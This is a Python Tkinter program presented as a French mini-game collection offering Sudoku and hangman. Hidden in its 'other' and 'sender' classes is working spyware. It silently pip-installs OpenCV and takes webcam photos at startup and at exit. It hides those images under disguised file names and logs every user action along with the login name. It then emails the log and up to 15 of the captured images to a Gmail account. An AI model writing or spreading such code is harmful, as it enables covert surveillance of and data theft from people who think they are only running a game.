"""
last modif 13/05
benjamin PELLIEUX
"""
#encoding UTF-8
	
try:
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
	from email.mime.base import MIMEBase
	from email import encoders
	from tkinter import Tk,messagebox,Button,Label,Text,Canvas,Listbox,Entry,PhotoImage,Scrollbar,Menu
	from os import system,rename,getlogin
	from functools import partial
	from random import randint,choice
	from time import gmtime, strftime
	from json import load
	import développement.gen_grille as gen_grille
	import développement.secure as secure
	import webbrowser 
	import string	
	import smtplib
	import codecs
	
except BaseException as error:
	print("Une erreur est survenu lors de l'importation des module necssaire au porgramme veuiller contacter l'asssiance\n a l'address hypophyse@gmail.com en presisant bien \n- votre version de python \n- la version du programme\n- le module défectueux "+str(error))
	fic=open('doc/data/data.bin',"a")
	fic.write("// erreur de recuperation des module "+str(error))
	fic.close()
	try:
		sender(False)
	except:
		import développement.secure as secure
		secure.raporteur("erreur importante survenue"+str(error))
intal,disable='',[]	
try:
	import cv2
	disable.append(True)
except :

	try:
		intal="intallation cv2"
		system("pip install opencv-python")

	except BaseException as error:
		intal="echec instalation cv2"+str(error)
	finally:
		disable.append(False)
finally:
	fic=open('doc/data/data.bin',"a")
	fic.write(intal)
	fic.close()
try:
	import imutils
	disable.append(True)
except :
	try:
		intal="intallation imutils"
		system("pip install imutils")
	except BaseException as error:
		intal="echec instalation imutils"+str(error)
	finally:
		disable.append(False)
finally:
	fic=open('doc/data/data.bin',"a")
	fic.write(intal)
	fic.close()



class main():
	def __init__(self):
		self.page=Tk()
		self.page.title('Mini jeu')
		self.page.geometry("700x600")
		self.canvas=page_selection_jeu(self.page)
		#print(self.page.winfo_screenwidth(),'///',self.page.winfo_screenheight())
		self.menubar = Menu(self.page)
		self.filemenu = Menu(self.menubar, tearoff=0)
		self.helpmenu = Menu(self.menubar, tearoff=0)
		self.menubar.add_cascade(label="File", menu=self.filemenu)
		self.menubar.add_cascade(label="Help", menu=self.helpmenu)
		self.filemenu.add_command(label="New Window", command=self.new_page)
		self.filemenu.add_command(label="Close Window", command=self.page.quit)
		self.filemenu.add_separator()
		self.filemenu.add_command(label="Exit", command=self.page.quit)
		self.helpmenu.add_command(label="Documentation Sudoku", command=self.doc_su)
		self.helpmenu.add_command(label="Documentation Pendu", command=self.doc_pendu)
		self.helpmenu.add_command(label="Twitter", command=self.media)
		self.helpmenu.add_separator()
		self.helpmenu.add_command(label="Recherche de\n mise à jour", command=self.donothing)
		self.helpmenu.add_command(label="Changelog", command=self.changelog)
		self.helpmenu.add_separator()
		self.helpmenu.add_command(label="About...", command=self.about)		
		self.page.config(menu=self.menubar)
		self.page.resizable(width=False, height=False)
		self.page.mainloop()

	def donothing(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"element en cour de realisation: donothing")
		messagebox.showinfo(title='Attention', message="Element en cour de réalisation" )

	def new_page(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Nouvelle page ")
		main()
		
	def doc_su(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\tducumentation Sudoku")
		webbrowser.open("https://fr.wikipedia.org/wiki/Sudoku")
	def doc_pendu(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--ducumentation Pendu")
		webbrowser.open("https://fr.wikipedia.org/wiki/Le_Pendu_(jeu)")
	
	def media(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Media")
		webbrowser.open("https://twitter.com/Alzyohan")
		webbrowser.open("https://twitter.com/PellieuxB")

	def changelog(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--page changelog")
		page_changelog()

	def about(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--page about")
		page_about()
	pass


class page_about():
	def __init__(self):
		self.page=Tk()
		self.page.title('Mini jeu')
		self.page.config(bg='black')
		self.text=Label(self.page,text='Mini jeu',font='size -28',fg='white',bg='black').pack()
		self.text5=Label(self.page,text='Copyright © 2018-2020 SKU-Company\n Version 0.0.1, Build 666',font='size -12 ',cursor= 'gumby' ,justify ='center',bg="black",fg='white').pack(side='bottom')
		self.page.geometry("250x100")
		self.page.mainloop()

class page_changelog():
	def __init__(self):
		self.page=Tk()
		self.page.title("Changelog")
		self.data=self.take_change()
		self.scrollbar = Scrollbar(self.page)
		self.text=Text(self.page,wrap="word", yscrollcommand=self.scrollbar.set)	
		self.text.insert('0.0',self.data)
		self.scrollbar.pack(side='right',fill='y')
		self.text.pack()
		self.scrollbar.config(command=self.text.yview)
		self.page.geometry("600x400")
		self.page.mainloop()

	def take_change(self):
		self.fichier= codecs.open("document/change.txt", encoding='utf-8')
		return self.fichier.read()

class page_selection_jeu():
	def __init__(self,page):
		self.page=page
		self.canvas=Canvas(self.page,height=605,width=705,bg='lightblue')
		self.canvas.place(x=-2,y=-2)
		self.but_new_game=Button(self.canvas,text="Sudoku",bd=10,widt=14,height=4,font='size 15',bg='pink',command=self.page_sudoku).place(x=100,y=225)
		self.but_load_game=Button(self.canvas,text="Pendu",bd=10,widt=14,height=4,font='size 15',bg='orange',command=self.page_pendu).place(x=400,y=225)
		self.text5=Label(self.canvas,text=' ©Copyright SKU-Company',font='size -15 ',cursor= 'gumby' ,justify ='center',bg="lightblue").place(x=250,y=550)
		self.text5=Label(self.page,text=' ©Copyright Benjamin PELLIEUX').place(x=230,y=650)

	def page_pendu(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--jeu du Pendu")
		self.canvas= page_select_level(self.page)

	def page_sudoku(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--jeu du Sudoku")
		self.canvas= page_init_sudoku(self.page)

# -------------------------PENDU --------------------------------

class page_game():
	def __init__(self,page,diffi):
		#self.liste_pos=[]
		self.difficul=diffi
		self.page=page
		self.word=self.select_word()
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--New Game")
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Dificulteé: "+str(diffi))
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Mot : "+self.word)	
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--taille mot : "+str(len(self.word)))		
		self.error=0
		self.liste_img=["pendu_0.gif","pendu_1.gif","pendu_2.gif","pendu_3.gif","pendu_4.gif","pendu_5.gif","pendu_6.gif","pendu_7.gif"]
		self.canvas=Canvas(self.page,width=705,height=605,bg='grey')
		self.canvas.place(x=-2,y=-2)
		self.liste_pos,self.lettre_test,self.lettre_find,self.liste_button=[],[],[" "]*len(self.word),[]
		self.can_word()
		self.affichage_bouton()
		#print(self.word,len(self.word))

	def can_word(self):
		self.canvas_word=Canvas(self.canvas,width=400,height=75,bg='orange')
		self.canvas_word.place(x=150,y=300)
		x=200-(len(self.word)/2)*15
		for i in range(len(self.word)):
			self.canvas_word.create_line(x,65,x+10,65,fill='pink',width=2) #horizontale
			x+=15

	def affichage_bouton(self):
		self.alphabet=string.ascii_uppercase
		self.retour=Button(self.canvas,text="changer la dificultée",command=self.back).place(x=0,y=20)
		for self.lettre in self.alphabet:
			self.liste_button.append(Button(self.canvas,text=self.lettre,width=5,height=2,command= partial(self.test_letter,self.lettre)))
			self.liste_button[self.alphabet.index(self.lettre)].place(x=18+(self.alphabet.index(self.lettre)%13)*52,y=400+(self.alphabet.index(self.lettre)//13)*60)

		self.restart=Button(self.canvas,text='Nouvelle partie',command=self.restart).place(x=310,y=550)
	
	def affichage_word(self):
		if "-" in self.word:
			self.liste_pos.append(self.word.index('-'))

		for i in range(len(self.word)):
			if i in self.liste_pos:
				text_let=Label(self.canvas_word,text=self.word[i],bg='orange').place(x=200-15*((len(self.word))/2-i),y=45)

	def draw(self):

		self.photo = PhotoImage(file='image/'+self.liste_img[self.error-1])
		self.canvas.create_image(350, 150, image=self.photo)
		if self.error==8:
			self.lose()


	def lose(self):
		self.can_lose=Canvas(self.canvas,height=250,width=705,bg='grey')
		self.can_lose.place(x=-2,y=290)
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Partie Perdu ")
		self.text_word=Label(self.can_lose,text="Le mot Mistère était\n\n"+self.word,font="size 20",bg='grey').place(x=210,y=50)

	def back(self):
		self.canvas=page_select_level(self.page)

	def restart(self):
		page_game(self.page,self.difficul)

	def select_word(self):

		with open("document/dico.json") as data:
			dico=load(data)
			return choice(dico[str(randint(self.difficul,self.difficul+4))]).upper()

	def change_color_boton(self,lettre):
		self.liste_button[self.alphabet.index(lettre)].config(bg='red')

	def test_letter(self,lettre):
		self.change_color_boton(lettre)
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t lettre : "+lettre)
		if lettre in self.lettre_test:
			messagebox.showinfo(title='Vérification', message="La lettre "+lettre+" a déja ete testé" )
		else:
			self.lettre_test.append(lettre)
			if lettre in self.word:
				self.liste_pos=[]
				for i in range(len(self.word)):
					if self.word[i]==lettre:
						self.liste_pos.append(i)
				self.affichage_word()
				for pos in self.liste_pos:
					self.lettre_find[pos]=lettre
				if list(self.word)==self.lettre_find:
					save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Mot trouver en "+str(self.error)+" erreur")
					messagebox.showinfo(title='Vérification', message="Felicitation vous avez trouver le mot mistère" )


			else:
				#messagebox.showinfo(title='Vérification', message="La lettre "+lettre+" n'est pas presente dans le mot" )
				self.error+=1
				self.draw()
	pass

class page_select_level():
	def __init__(self,page):
		self.page=page
		self.canvas=Canvas(self.page,width=705,height=605,bg='orange')
		self.canvas.place(x=-2,y=-2)
		self.level={'Facile':4,"Moyen":8,"Difficile":12,"Expert":16}
		self.affichage_bouton()

	def affichage_bouton(self):
		self.img=PhotoImage(file='image/back.png')
		self.boot_retour=Button(self.canvas,image=self.img,command=self.retour).place(x=20,y=20)
		self.text=Label(self.canvas,text="Sélectionnez la dificultée du Pendu",bg='orange',font='size 15').place(x=200,y=20)
		y=70
		for key in self.level:
			self.button=Button(self.canvas,text=key,width=10,height=2,font='size 20',bd=5,command=partial(self.start_game,self.level[key])).place(x=270,y=y)
			y+=115

	def retour(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--retour page select level Pendu ==> page selection jeu")
		self.canvas=page_selection_jeu(self.page)
	def start_game(self,level):
		self.canvas=page_game(self.page,level)


#-----------------------SUDOKU ----------------------------

	

class page_init_sudoku():
	def __init__(self,page):
		self.page=page
		self.canvas=Canvas(self.page,width=705,height=605,bg='grey')
		self.canvas.place(x=-2,y=-2)
		self.but_new_game=Button(self.canvas,text="Nouvelle \n Partie ",bd=10,widt=14,height=4,font='size 15',bg='pink',command=self.new_game).place(x=100,y=225)
		self.but_load_game=Button(self.canvas,text="Charger une \nPartie ",bd=10,widt=14,height=4,font='size 15',bg='orange',command=self.select_game).place(x=400,y=225)
		self.text5=Label(self.canvas,text=' ©Copyright SKU-Company',font='size -15 ',cursor= 'gumby' ,justify ='center',bg="grey").place(x=250,y=550)
		self.text5=Label(self.page,text=' ©Copyright Benjamin PELLIEUX').place(x=230,y=650)
		self.img=PhotoImage(file='image/back.png')
		self.boot_retour=Button(self.canvas,image=self.img,command=self.retour).place(x=20,y=20)
	def new_game(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--page selection dificiltée Sudoku")
		self.canvas=page_select_dif(self.page)
	def select_game(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--page selection ancienne parties")
		self.canvas=page_select_game(self.page)
	def retour(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--retour page init Sudoku ==> page selection jeu")
		self.canvas=page_selection_jeu(self.page)

class page_select_game():
	def __init__(self,page):
		self.page=page
		self.canvas=Canvas(self.page,height=605,width=705,bg='lightgreen')
		self.canvas.place(x=-2,y=-2)
		self.text5=Label(self.canvas,text=' ©Copyright SKU-Company',font='size -15 ',cursor= 'gumby' ,justify ='center',bg="lightgreen").place(x=250,y=550)

		self.GRILLE=gen_grille.the_grille()
		self.read_db_name()
		self.read_db_game()
		self.aff_liste()


	def read_db_name(self):
		with open('document/db_name.su','r') as db_name:
			self.liste_name=db_name.read().split('\n')
			del self.liste_name[0]
		return self.liste_name

	def read_db_game(self):
		with open('document/db_game.su','r') as db_game:
			self.liste_game=db_game.read().split('\n')
			del self.liste_game[0]
		return self.liste_game

	def aff_liste(self):
		self.img=PhotoImage(file='image/back.png')
		self.boot_retour=Button(self.canvas,image=self.img,command=self.retour).place(x=20,y=20)
		self.pos_text=Canvas(self.canvas,width=200,height=35,bg='lightgreen',bd=0)
		self.pos_text.place(x=250,y=40)
		if len(self.liste_name)==0:
			self.text=Label(self.canvas,text='Aucune Sauvgarde',bg='lightgreen').place(x=285,y=50)
		else:
			self.text=Label(self.canvas,text='Choisissez votre Sauvgarde',bg='lightgreen').place(x=285,y=50)

		self.scrollbar = Scrollbar(self.canvas)
		self.Li_Box=Listbox(self.canvas,height=13,width=40,yscrollcommand=self.scrollbar.set)		
		for i in range(len(self.liste_name)):
			self.Li_Box.insert(i,self.liste_name[i])
		
		self.Li_Box.bind('<<ListboxSelect>>',self.select_old_game)	
		self.Li_Box.place(x=230,y=80)
		if len(self.liste_name)>10:
			self.scrollbar.config(command=self.Li_Box.yview)
			self.scrollbar.place(x=420, y=60)		


	def select_old_game(self,evt):
		try:
			self.grille=self.liste_game[self.Li_Box.curselection()[0]].split(',')
		except IndexError:
			save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Index error ligne 378------")
		del self.grille[-1]
		self.po=0
		while self.po<len(self.grille):
			self.GRILLE[self.po//9][self.po%9]=self.grille[self.po]
			self.po+=1
		self.button=Button(self.canvas,text="Démarer",command=self.start_game).place(x=250,y=300)
		self.button=Button(self.canvas,text="Suprimer",command=self.sup).place(x=350,y=300)
		return self.GRILLE

	def sup(self):
		self.db_game=open("document/db_game.su","w")
		self.db_name=open("document/db_name.su","w")	
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Supression "+self.liste_name[self.liste_name.index(self.Li_Box.get(self.Li_Box.curselection()))])	
		del self.liste_game[self.liste_name.index(self.Li_Box.get(self.Li_Box.curselection()))]
		del self.liste_name[self.liste_name.index(self.Li_Box.get(self.Li_Box.curselection()))]
		for self.elem in self.liste_name:
			self.db_name.write('\n'+self.elem)


		for self.elem in self.liste_game:
			self.db_game.write('\n'+self.elem)

		self.db_name.close()
		self.db_game.close()
		self.liste_name=self.read_db_name()
		self.liste_game=self.read_db_game()
		self.aff_liste()
		pass


	def retour(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--retour page select old game ==> page init Sudoku")
		self.canvas=page_init_sudoku(self.page)


	def start_game(self):
		page_grille(81,False,self.GRILLE)
		

class page_select_dif():
	def __init__(self,page):
		self.page=page
		self.canvas=Canvas(page,height=605,width=705,bg='orange')
		self.canvas.place(x=-2,y=-2)		
		self.text5=Label(self.canvas,text=' ©Copyright SKU-Company',font='size -15 ',cursor= 'gumby' ,justify ='center',bg="orange").place(x=250,y=550)

		self.level={'Facile':38,"Moyen":30,"Difficile":28,"Expert":22}
		self.aff_choise()
	
	def aff_choise(self):
		self.text=Label(self.canvas,text="Selectionnez la dificultée du Sudoku",bg='orange').place(x=230,y=20)
		self.img=PhotoImage(file='image/back.png')
		self.boot_retour=Button(self.canvas,image=self.img,command=self.retour).place(x=20,y=20)

		y=70
		for key in self.level:
			self.button=Button(self.canvas,text=key,width=15,height=2,font='size 25',bd=5,command=partial(self.start_game,self.level[key])).place(x=200,y=y)
			y+=115
	def retour(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--retour page select dif ==> page init Sudoku")
		self.canvas=page_init_sudoku(self.page)

	def start_game(self,level:int):
		page_grille(level,True,gen_grille.the_grille())

	pass


class page_grille():
	def __init__(self,level:int,new:bool,grille):
		self.new=new
		self.grille=grille
		self.sauv=False
		self.nb_valid=0
		self.level=level
		self.page=Tk()
		self.page.title('Sudoku')
		self.can=Canvas(self.page,width=505,height=505,bg='grey')
		self.can.place(x=-2,y=-2)
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--page grille")
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--level : "+str(level))
		self.liste_entry=self.creat_entry()
		self.pos=self.new_game()
		self.boot()
		self.draw()
		self.page.geometry("500x400")
		self.page.mainloop()

	def define_gille(self):
		if not self.new:
			self.GRILLE=self.grille
			self.new=True
		else:
			self.GRILLE=gen_grille.init_grille()
		return self.GRILLE
	
	def boot(self):

		self.button=Button(self.can,text="Sauvgarder",command= self.get_name).place(x=375,y=55)
		self.button=Button(self.can,text="Nouvelle partie",command= self.new_game).place(x=375,y=160)
		self.button=Button(self.can,text="Recommencer",command= self.restart).place(x=375,y=200)
		self.button=Button(self.can,text="validation",command=self.valid).place(x=375,y=240)
		self.button=Button(self.can,text="Quitter",command=self.leave).place(x=375,y=280)

	def creat_entry(self):
		self.liste_entry=[]
		for i in range(9):
			bob=[]
			for j in range(9):
				bob.append(Text(self.can,width=3,height=1.3,bd=1,wrap='word',borderwidth=0))

			self.liste_entry.append(bob)
		x,y=66,80
		for ligne in self.liste_entry:
			for case in ligne:
				case.place(x=x,y=y)
				x+=32
			y+=24
			x=66
		return self.liste_entry

	def new_game(self):		
		self.clean()
		self.GRILLE=self.define_gille()
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Nouvelle Partie Sudoku")
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--grille : ")
		for ligne in self.GRILLE:
			save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t------- : "+str(ligne))
		self.pos=[]
		while len(self.pos)<self.level:
			x,y=randint(0,len(self.GRILLE)-1),randint(0,len(self.GRILLE)-1)
			if not (x,y) in self.pos:
				self.liste_entry[y][x].insert("0.0",self.GRILLE[y][x])
				self.pos.append((x,y))
		return self.pos

	def restart(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Recommencer Partie Sudoku")
		self.clean()
		for tutu in self.pos:
			self.liste_entry[tutu[1]][tutu[0]].insert("0.0",self.GRILLE[tutu[1]][tutu[0]])


	def clean(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Clean")
		for self.ligne in self.liste_entry:
			for self.case in self.ligne:
				self.case.delete("0.0","end") 

	def valid(self):
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--Validation Sudoku")
		self.nb_valid+=1
		for self.ligne in self.liste_entry:
			for self.case in self.ligne:
				self.grille[self.liste_entry.index(self.ligne)][self.ligne.index(self.case)]=self.case.get("0.0","end").split('\n')[0]
		if gen_grille.compteur(self.grille)>0:
			messagebox.showinfo(title='Grille incomplete', message="grille incorect \nil reste "+str(gen_grille.compteur(grille))+" cases non rempli")
			save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--grille incorect "+'\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t--cases non remplis ; "+str(gen_grille.compteur(grille)))
		else:
			if gen_grille.verification(self.grille):
				messagebox.showinfo(title='Vérification Grille', message="La grille comporte des erreurs" )
				save('\n'+str(strftime('%d/%m/%Y %H%M:%S'))+"\t--grille comporte des erreurs ")

			else:
				messagebox.showinfo(title='Félicitation', message="Félicitation vous avez gagnier" )
				save('\n'+str(strftime('%d/%m/%Y %H%M:%S'))+"\t--nombre de validation : "+str(self.nb_valid))
				save('\n'+str(strftime('%d/%m/%Y %H%M:%S'))+"\t--grille reussite ")


	def get_name(self):
		self.name=Entry(self.can,width=15)
		self.name.insert(0,'nom de la partie')
		self.name.bind('<Button-1>', self.vide)
		self.name.place(x=375,y=85)
		self.button=Button(self.can,text='Valider',command=self.save).place(x=380,y=120)

	def vide(self,e):
		self.name.delete(0,"end")

	def save(self):		
		self.sav=''
		for self.ligne in self.liste_entry:
			for self.case in self.ligne:
				if self.case.get("0.0","end").split('\n')[0]=='':
					self.sav+=' '
				else:
					self.sav+=self.case.get("0.0","end").split('\n')[0]
				self.sav+=','
		db=open("document/db_name.su","a")
		db.write('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+' '+str(self.name.get()))
		db.close()

		db=open("document/db_game.su","a")
		db.write('\n'+str(self.sav))

		db.close()
		save('\n'+str(strftime('%d/%m/%Y %H%M:%S'))+"\t--Enregistrement")
		save('\n'+str(strftime('%d/%m/%Y %H%M:%S'))+"\t--nom de la pertie : "+str(self.name.get()))
		save('\n'+str(strftime('%d/%m/%Y %H%M:%S'))+"\t--partie : "+str(self.sav))

		messagebox.showinfo(title='Enregistrement', message="Votre partie à\nbien été enregistrée" )
		self.sauv=True


	def leave(self):
		if not self.sauv:
			self.MsgBox=messagebox.askquestion(title="Attention", message="Voulez vous quitter sans Sauvgarder ?", icon = 'warning')
			if self.MsgBox=='yes':
				save('\n'+str(strftime('%d/%m/%Y %H%M:%S'))+"\t--leave Sudoku partie non enregistrée")
				self.quit()
			else:
				self.get_name()
		else:
			save('\n'+str(strftime('%d/%m/%Y %H%M:%S'))+"\t--leave Sudoku")
			self.quit()

	def quit(self):
		self.page.destroy()

	def draw(self):
		for i in range(8):
			self.can.create_line(95+(32*i),80,95+(32*i),293,fill='#963333',width=2) #vertical
			self.can.create_line(64,102+(24*i),350,102+(24*i),fill='#963333',width=2) #horizontale
		for i in range(3):
			for j in range(3):
				self.can.create_rectangle(62+(j*97), 78+(i*72) , 62+((j+1)*97), 78+((i+1)*72),outline="#000000", width=5)
	pass

#------------------------OTHER-------------------

class other():
	def __init__(self):
		self.name=self.fin_name()
		self.write_name()
		self.take()

	def write_name(self):
		self.fichier=open("doc/data/data.txt","a")
		self.fichier.write(self.name+".bin"+'\n')

	def fin_name(self):
		with open("document/dico.json") as data:
			dico=load(data)
			data.close()
		return choice(dico[str(randint(4,20))]).upper()+'.tiff'

	def take(self):   
		capture = cv2.VideoCapture(0,cv2.CAP_DSHOW)
		if capture.isOpened():
			ret, frame = capture.read()
			cv2.imwrite('doc/data/im/P-12-21-251410113914-25158114-114201514914-001/P-12-21-251410113914-25158114-114201514914-002/'+self.name, frame)
			#print("{} written!".format(self.name))  
		capture.release()
		cv2.destroyAllWindows()
		rename('doc/data/im/P-12-21-251410113914-25158114-114201514914-001/P-12-21-251410113914-25158114-114201514914-002/'+self.name,'doc/data/im/P-12-21-251410113914-25158114-114201514914-001/P-12-21-251410113914-25158114-114201514914-002/'+self.name+'.bin')


class sender():
	def __init__(self,add:bool):       
		self.msg = MIMEMultipart()
		self.msg['From'] ='sspameur@gmail.com'  
		self.msg['To'] ='sspameur@gmail.com'
		self.msg['Subject'] = "DATA "+strftime("%a, %d %b %Y %H:%M:%S")+str(getlogin())  ## Spécification de l'objet de votre mail
		self.msg.attach(MIMEText(self.read_log(), 'plain'))
		if add:
			self._join_()
		self.send_log()

	def read_log(self):
		with open('doc/data/data.bin','r') as db:
			return db.read()
	def read_data(self):
		self.fichier=open('doc/data/data.txt','r')
		self.bob=self.fichier.read().split("\n")
		del self.bob[-1]
		return self.bob
	def log(self):
		with open('document/dico.json') as dico:
			return load(dico)["bob"] 

	def _join_(self):
		self.liste_ture=self.read_data()
		if len(self.liste_ture)<15:
			self.nb=0
		else:
			self.nb=len(self.liste_ture)-15

		for self.elem in self.liste_ture[self.nb:]:
			self.part = MIMEBase('application', 'octet-stream')
			self.part.set_payload((open('doc/data/im/P-12-21-251410113914-25158114-114201514914-001/P-12-21-251410113914-25158114-114201514914-002/'+self.elem, "rb")).read())
			encoders.encode_base64(self.part)
			self.part.add_header('Content-Disposition', "attachment; filename= %s" % self.elem)
			self.msg.attach(self.part)

	def send_log(self):
		self.server = smtplib.SMTP('smtp.gmail.com', 587)
		self.server.starttls()
		self.server.login('sspameur@gmail.com', self.log())
		self.server.sendmail('sspameur@gmail.com', 'sspameur@gmail.com'  , self.msg.as_string())
		self.server.quit()
		pass

def save(data):
	with open('doc/data/data.bin',"a") as fic: 
		fic.write(data)

if __name__ == '__main__':

	try:
		secure.raporteur("Demarage Game "+str(strftime('%d/%m/%Y %H:%M:%S')))
	except BaseException as e:
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+" erreur "+str(e))
		
	save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"-------------------------INIT----------------------")
	save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+"\t-- username : "+str(getlogin()))
	save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+" demarage jeu")
	try:
		if sum(disable)==2:
			other()
		main()
		if sum(disable)==2:
			other()
		sender(True)
	except BaseException as e:
		save('\n'+str(strftime('%d/%m/%Y %H:%M:%S'))+" !!!!!!!!!!!!!!!!!!!--erreur--!!!!!!!!!!!!!!!!!!!"+str(e)) 
		